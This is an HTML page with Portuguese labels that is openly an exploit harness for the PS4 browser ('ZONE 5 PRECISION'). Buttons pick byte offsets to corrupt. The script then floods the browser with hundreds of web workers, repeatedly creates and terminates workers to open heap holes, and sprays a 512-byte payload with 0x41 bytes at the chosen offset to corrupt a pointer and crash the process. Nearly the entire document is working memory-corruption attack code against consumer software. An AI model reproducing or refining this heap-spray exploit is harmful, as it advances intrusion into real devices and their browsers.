<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 ZONE 5 PRECISION</title>
    <style>
        body { background-color: #000; color: #0ff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { color: #ff0; border-bottom: 2px solid #ff0; display: inline-block; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; max-width: 700px; margin: 30px auto; }
        button { 
            padding: 20px; font-size: 1.1em; background: #222; color: #fff; border: 1px solid #444; cursor: pointer;
            font-family: monospace; font-weight: bold;
        }
        button:hover { background: #f00; border-color: #f00; }
        #status { font-size: 1.5em; margin: 20px; color: #fff; }
        .danger { color: #f00; animation: blink 0.5s infinite; }
        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
    </style>
</head>
<body>

    <h1>ZONE 5 PRECISION (Bytes 256-319)</h1>
    <div id="status">Selecione um Offset para Corromper</div>

    <div class="grid">
        <button onclick="attack(256)">OFFSET 256 (0x100)</button>
        <button onclick="attack(264)">OFFSET 264 (0x108)</button>
        <button onclick="attack(272)">OFFSET 272 (0x110)</button>
        <button onclick="attack(280)">OFFSET 280 (0x118)</button>
        <button onclick="attack(288)">OFFSET 288 (0x120)</button>
        <button onclick="attack(296)">OFFSET 296 (0x128)</button>
        <button onclick="attack(304)">OFFSET 304 (0x130)</button>
        <button onclick="attack(312)">OFFSET 312 (0x138)</button>
    </div>

    <script>
        const TARGET_LIMIT = 415; // Seguro
        const SPRAY_SIZE = 512;
        
        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function attack(offset) {
            document.getElementById('status').innerText = `ATACANDO OFFSET ${offset}...`;
            document.getElementById('status').className = "danger";
            
            // 1. Prepara Payload: Tudo Zeros, exceto o alvo que vira LIXO (0x41)
            // Usamos 0x41 ('A') porque 0xFF às vezes é interpretado como -1 (válido em alguns checks)
            // Mas um ponteiro 0x4141414141414141 é certeza de crash se acessado.
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            
            // Escreve 8 bytes de "AAAA..." no offset escolhido
            for(let i=0; i<8; i++) payload[offset + i] = 0x41;

            startSprayProcess(payload);
        }

        function startSprayProcess(payload) {
            workers = [];
            
            // Enche rápido
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    // Como você disse que crasha rápido, nem esperamos muito.
                    // Iniciamos o spray imediatamente.
                    document.getElementById('status').innerText += " INJETANDO...";
                    doSpray(payload);
                }
            }, 30);
        }

        function doSpray(payload) {
            // Loop Infinito de injeção
            setInterval(() => {
                // Abre buraco
                const w = new Worker(killerUrl);
                w.terminate();
                
                // Tenta preencher com o payload específico
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

    </script>
</body>
</html>
